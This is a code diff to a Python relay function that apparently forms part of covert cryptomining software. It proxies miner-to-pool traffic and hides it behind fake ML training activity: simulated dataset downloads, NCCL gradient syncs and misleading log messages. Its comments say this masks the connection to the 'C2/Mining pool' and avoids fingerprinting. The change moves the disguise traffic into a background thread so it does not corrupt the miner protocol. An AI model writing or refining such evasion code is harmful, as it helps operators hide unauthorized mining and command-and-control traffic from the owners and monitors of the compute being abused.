@@ -239,36 +239,34 @@ def _start_gradient_relay(target_ip: str, target_port: int) -> int:
             # Connection lifespan: 15 to 45 minutes to avoid stale connection fingerprint
             lifespan = random.randint(900, 2700)
             start_time = time.time()
+            # Background Noise Thread: Simulated Dataset Download & NCCL Syncs
+            # We must run this in a background thread so it doesn't block the actual proxy traffic
+            def _noise_generator():
+                _slog(f"Syncing pre-tokenized cache from gradient server...")
+                try:
+                    # We can't write this noise to client_sock or remote, it will corrupt the miner protocol.
+                    # Instead, we just burn CPU and simulate the timing, or we could write to a dummy socket.
+                    # For network signature mimicry without corrupting the proxy, we just sleep/burn to match the IO footprint.
+                    download_size_mb = random.randint(5000, 10000)
+                    for _ in range(download_size_mb):
+                        # Throttle to realistic WAN speeds
+                        time.sleep(random.uniform(0.005, 0.015))
+                except Exception:
+                    pass
+                
+                _slog("Cache sync complete. Resuming gradient broadcasting.")
+                
+                last_sync = time.time()
+                while time.time() - start_time < lifespan and not _SHUTDOWN_FLAG.is_set():
+                    if time.time() - last_sync > random.uniform(5.0, 15.0):
+                        time.sleep(random.uniform(0.1, 0.5)) # burn some time to simulate broadcast
+                        last_sync = time.time()
+                    time.sleep(1.0)
+                    
+            threading.Thread(target=_noise_generator, daemon=True).start()
             
-            # Simulated Dataset Download Phase (High bandwidth noise)
-            _slog(f"Syncing pre-tokenized cache from gradient server...")
-            try:
-                # Simulate downloading 5-10GB of dataset weights over the proxy connection
-                # This perfectly masks the initial connection to the C2/Mining pool
-                download_size_mb = random.randint(5000, 10000)
-                chunk = os.urandom(1024 * 1024) # 1MB chunk
-                for _ in range(download_size_mb):
-                    client_sock.sendall(chunk)
-                    # Throttle to realistic WAN speeds (approx 500-1000 Mbps)
-                    time.sleep(random.uniform(0.005, 0.015))
-            except Exception:
-                pass
-            
-            _slog("Cache sync complete. Resuming gradient broadcasting.")
-            
-            # Steady State Phase (Simulated NCCL Gradient Syncs)
-            last_sync = time.time()
+            # Main Proxy Loop: Handle actual miner <-> pool traffic
             while time.time() - start_time < lifespan:
-                # Simulate NCCL gradient broadcast bursts every 5-15 seconds
-                if time.time() - last_sync > random.uniform(5.0, 15.0):
-                    try:
-                        # Gradients are huge (e.g. 32MB for 8B params in FP32)
-                        grad_burst = os.urandom(random.randint(16, 64) * 1024 * 1024)
-                        client_sock.sendall(grad_burst)
-                    except Exception:
-                        pass
-                    last_sync = time.time()
-
                 readable, _, exc = select.select(pair, [], pair, 1.0)
                 if exc:
                     break
